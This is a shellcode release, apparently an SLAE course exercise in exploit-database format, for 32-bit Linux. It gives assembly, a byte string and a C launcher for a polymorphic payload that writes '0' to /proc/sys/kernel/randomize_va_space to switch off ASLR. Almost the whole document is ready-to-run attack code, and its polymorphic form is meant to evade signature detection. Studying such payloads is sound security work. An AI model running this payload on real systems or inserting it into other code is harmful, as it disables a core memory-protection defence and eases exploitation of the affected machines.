# Title: Linux/x86 - ASLR deactivation polymorphic shellcode ( 124 bytes )
# Author: Xenofon Vassilakopoulos
# Date: 2020-06-11
# Tested on: Linux 3.13.0-32-generic #57~precise1-Ubuntu i686 i386 GNU/Linux
# Architecture: i686 GNU/Linux
# Shellcode Length: 124 bytes
# Original shellcode: http://shell-storm.org/shellcode/files/shellcode-813.php
# SLAE-ID: SLAE - 1314
# Description: polymorphic version of ASLR deactivation shellcode


------------------ ASLR deactivation ------------------

global _start

section .text

_start:
        xor    ebx,ebx
        mul    ebx
        mov    DWORD [esp-0x4],eax
        mov    DWORD [esp-0x8],0x65636170
        mov    DWORD [esp-0xc],0x735f6176
        mov    DWORD [esp-0x10],0x5f657a69
        mov    DWORD [esp-0x14],0x6d6f646e
        mov    DWORD [esp-0x18],0x61722f6c
        mov    DWORD [esp-0x1c],0x656e7265
        mov    DWORD [esp-0x20],0x6b2f7379
        mov    DWORD [esp-0x24],0x732f636f
        mov    DWORD [esp-0x28],0x72702f2f
        sub    esp,0x28
        mov    ebx,esp
        mov    cx,0x301
        mov    dx,0x2a1
        add    dx,0x1b
        mov    al, 0x5
        int    0x80
        mov    ebx,eax
        push   ebx
        mov    cx,0x3b30
        push   cx
        mov    ecx,esp
        shr    edx, 16
        inc    edx
        mov    al,0x4
        int    0x80
        mov    al,0x1
        int    0x80

------------------ shellcode ------------------


#include <stdio.h>
#include <string.h>

unsigned char code[] = \
     "\x31\xdb\xf7\xe3\x89\x44\x24\xfc\xc7"
     "\x44\x24\xf8\x70\x61\x63\x65\xc7\x44"
     "\x24\xf4\x76\x61\x5f\x73\xc7\x44\x24"
     "\xf0\x69\x7a\x65\x5f\xc7\x44\x24\xec"
     "\x6e\x64\x6f\x6d\xc7\x44\x24\xe8\x6c"
     "\x2f\x72\x61\xc7\x44\x24\xe4\x65\x72"
     "\x6e\x65\xc7\x44\x24\xe0\x79\x73\x2f"
     "\x6b\xc7\x44\x24\xdc\x6f\x63\x2f\x73"
     "\xc7\x44\x24\xd8\x2f\x2f\x70\x72\x83"
     "\xec\x28\x89\xe3\x66\xb9\x01\x03\x66"
     "\xba\xa1\x02\x66\x83\xc2\x1b\xb0\x05"
     "\xcd\x80\x89\xc3\x53\x66\xb9\x30\x3b"
     "\x66\x51\x89\xe1\xc1\xea\x10\x42\xb0"
     "\x04\xcd\x80\xb0\x01\xcd\x80";

main()
{
printf("Shellcode Length: %d\n", strlen(code));

int (*ret)() = (int(*)())code;

ret();
}